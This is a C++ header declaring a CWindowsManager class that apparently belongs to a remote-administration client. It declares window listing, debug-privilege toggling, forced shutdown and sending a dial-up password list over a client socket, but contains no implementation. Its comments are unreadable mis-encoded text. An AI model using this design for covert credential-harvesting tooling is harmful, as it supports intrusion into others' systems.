// CProcessManager.h: interface for the CProcessManager class.
//
//////////////////////////////////////////////////////////////////////

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000
#include "Manager.h"
class CWindowsManager : public CManager
{
	public:
		CWindowsManager(CClientSocket* pClient, BYTE bHow);//bHow�Ǵ��������ܵı�־
		virtual ~CWindowsManager();
		virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

		static bool DebugPrivilege(const char* PName, BOOL bEnable);	//��Ȩ
		static bool CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam);	//�������ڵĻص���Ϣ������
		static void ShutdownWindows(DWORD dwReason);	//ǿ�ƹرմ���
	private:
		BYTE m_caseSystemIs;//���캯�����ʼ������������������ֽ��̻��ߴ��ڵı���

		LPBYTE getWindowsList();	//��ȡ������Ϣ����
		void SendWindowsList();		//���ʹ�����Ϣ����
		void SendDialupassList();
		void ShowTheWindow(LPBYTE buf);	//��ĳ�ַ�ʽչʾ����
		void CloseTheWindow(LPBYTE buf);	//�رմ���
};

